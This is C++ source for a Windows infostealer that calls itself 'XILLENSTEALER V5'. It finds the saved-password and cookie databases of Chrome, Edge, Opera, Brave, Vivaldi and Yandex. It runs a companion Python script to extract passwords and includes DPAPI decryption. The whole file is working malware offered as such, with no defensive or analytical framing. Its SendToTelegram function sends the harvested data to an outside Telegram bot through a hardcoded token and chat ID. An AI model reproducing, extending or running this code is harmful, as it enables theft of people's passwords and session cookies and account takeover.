#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <dpapi.h>
#include <wincrypt.h>
#include <iostream>
#include <string>
#include <sstream>
#include <vector>
#include <filesystem>
#include <fstream>
#include <algorithm>
#include <cctype>
#include <cstdio>
#include <cstdlib>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "crypt32.lib")

struct Browser {
    std::string name;
    std::string loginPath;
    std::string cookiesPath;
};

std::string GetUserDataPath() {
    char path[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, path);
    return std::string(path);
}

std::string GetRoamingPath() {
    char path[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, path);
    return std::string(path);
}

std::string URLEncode(const std::string& str) {
    std::string result;
    for (char c : str) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            result += c;
        } else if (c == ' ') {
            result += "%20";
        } else if (c == '\n') {
            result += "%0A";
        } else {
            char buf[4];
            sprintf_s(buf, "%%%02X", (unsigned char)c);
            result += buf;
        }
    }
    return result;
}

bool SendToTelegram(const std::string& message) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;
    
    std::string token = "8474305805:AAHZ98s7nr9IAFQehnqh0x3iGV1OmVhTq9I";
    std::string chatId = "7368280792";
    std::string encodedMsg = URLEncode(message);
    
    std::ostringstream url;
    url << "https://api.telegram.org/bot" << token 
        << "/sendMessage?chat_id=" << chatId 
        << "&text=" << encodedMsg;
    
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url.str().c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return false;
    }
    
    char buffer[1024];
    DWORD bytesRead;
    InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead);
    
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    return true;
}

std::string DecryptDPAPI(byte* encryptedData, DWORD encryptedSize) {
    DATA_BLOB in, out;
    in.pbData = encryptedData;
    in.cbData = encryptedSize;
    
    std::string result;
    if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
        result = std::string((char*)out.pbData, out.cbData);
        LocalFree(out.pbData);
    }
    return result;
}

std::string ExecutePython(const std::string& scriptPath, const std::string& args = "") {
    std::string cmd = "python \"" + scriptPath + "\"";
    if (!args.empty()) {
        cmd += " " + args;
    }
    cmd += " 2>&1";
    
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) return "";
    
    char buffer[128];
    std::string result = "";
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }
    _pclose(pipe);
    
    return result;
}

std::string ExtractPasswords(const std::string& dbPath) {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string dir = exePath;
    dir = dir.substr(0, dir.find_last_of("\\"));
    std::string pythonScript = dir + "\\browser_extractor.py";
    
    if (!std::filesystem::exists(pythonScript)) {
        return "[Python script not found at: " + pythonScript + "]";
    }
    
    std::string output = ExecutePython(pythonScript);
    
    // Парсим и извлекаем только PASSWORDS секцию
    std::istringstream iss(output);
    std::string line;
    std::string result;
    bool inPasswordSection = false;
    
    while (std::getline(iss, line)) {
        if (line.find("PASSWORDS ===") != std::string::npos) {
            inPasswordSection = true;
            result += line + "\n";
            continue;
        }
        if (line.find("=== ") != std::string::npos && inPasswordSection) {
            break; // Достигли следующей секции
        }
        if (inPasswordSection) {
            result += line + "\n";
        }
    }
    
    if (result.empty()) {
        return "[No passwords extracted - check Python dependencies]\n";
    }
    
    return result;
}

std::string ExtractCookies(const std::string& dbPath) {
    std::string result;
    
    std::string tempPath = std::filesystem::temp_directory_path().string() + "\\xillen_cookies.db";
    try {
        std::filesystem::copy_file(dbPath, tempPath, std::filesystem::copy_options::overwrite_existing);
    } catch (...) {
        return result;
    }
    
    std::ifstream file(tempPath, std::ios::binary);
    if (!file.is_open()) return result;
    
    file.seekg(0, std::ios::end);
    size_t fileSize = file.tellg();
    
    result = "[FOUND " + std::to_string(fileSize) + " bytes of cookie data]\n";
    result += "Note: Full decryption requires Python script with browser-cookie3\n";
    
    file.close();
    std::filesystem::remove(tempPath);
    return result;
}

int main() {
    std::cout << "========================================\n";
    std::cout << "XILLENSTEALER V5 - FULL STEALER\n";
    std::cout << "========================================\n\n";
    
    std::string localAppData = GetUserDataPath();
    std::string roamingAppData = GetRoamingPath();
    
    std::vector<Browser> browsers = {
        {"Chrome", localAppData + "\\Google\\Chrome\\User Data\\Default\\Login Data",
                    localAppData + "\\Google\\Chrome\\User Data\\Default\\Cookies"},
        {"Edge", localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Login Data",
                  localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Cookies"},
        {"Opera", roamingAppData + "\\Opera Software\\Opera Stable\\Login Data",
                  roamingAppData + "\\Opera Software\\Opera Stable\\Cookies"},
        {"Brave", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
                  localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies"},
        {"Vivaldi", localAppData + "\\Vivaldi\\User Data\\Default\\Login Data",
                    localAppData + "\\Vivaldi\\User Data\\Default\\Cookies"},
        {"Yandex", localAppData + "\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data",
                   localAppData + "\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies"},
    };
    
    std::ostringstream data;
    data << "XILLENSTEALER V5 - FULL DATA\n\n";
    
    int found = 0;
    int passCount = 0;
    int cookieCount = 0;
    
    // Один раз запускаем Python скрипт для всех браузеров
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string dir = exePath;
    dir = dir.substr(0, dir.find_last_of("\\"));
    std::string pythonScript = dir + "\\browser_extractor.py";
    
    if (std::filesystem::exists(pythonScript)) {
        std::cout << "[*] Running Python extraction script...\n";
        std::string pythonOutput = ExecutePython(pythonScript);
        data << pythonOutput << "\n";
    }
    
    // Считаем найденные браузеры
    for (const auto& browser : browsers) {
        bool foundBrowser = false;
        
        if (std::filesystem::exists(browser.loginPath)) {
            std::cout << "[+] " << browser.name << " PASSWORDS: Found!\n";
            passCount++;
            foundBrowser = true;
        }
        
        if (std::filesystem::exists(browser.cookiesPath)) {
            std::cout << "[+] " << browser.name << " COOKIES: Found!\n";
            cookieCount++;
            foundBrowser = true;
        }
        
        if (foundBrowser) {
            found++;
        }
    }
    
    data << "\n\nSUMMARY:\n";
    data << "Browsers found: " << found << "\n";
    data << "Password databases: " << passCount << "\n";
    data << "Cookie databases: " << cookieCount << "\n";
    
    std::cout << "\n[+] Found: " << found << " browsers\n";
    std::cout << "[+] Password files: " << passCount << "\n";
    std::cout << "[+] Cookie files: " << cookieCount << "\n";
    
    std::cout << "\n[*] Sending to Telegram...\n";
    if (SendToTelegram(data.str())) {
        std::cout << "[+] SUCCESS! All data sent to Telegram!\n";
    } else {
        std::cout << "[!] Failed to send\n";
    }
    
    std::cout << "\nPress Enter to exit...\n";
    std::cin.get();
    
    return 0;
}
